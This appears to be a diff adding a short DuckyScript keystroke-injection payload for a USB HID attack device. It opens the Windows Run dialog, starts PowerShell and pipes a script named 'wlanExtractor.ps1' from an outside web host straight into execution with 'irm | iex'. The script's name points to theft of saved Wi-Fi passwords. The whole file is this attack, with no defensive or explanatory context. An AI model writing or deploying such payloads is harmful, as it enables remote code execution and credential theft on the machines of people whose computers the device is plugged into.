@@ -1,0 +1,4 @@
+GUI r
+DELAY 250
+STRING powershell irm https://scripts-sable.vercel.app/wlanExtractor.ps1 | iex
+ENTER
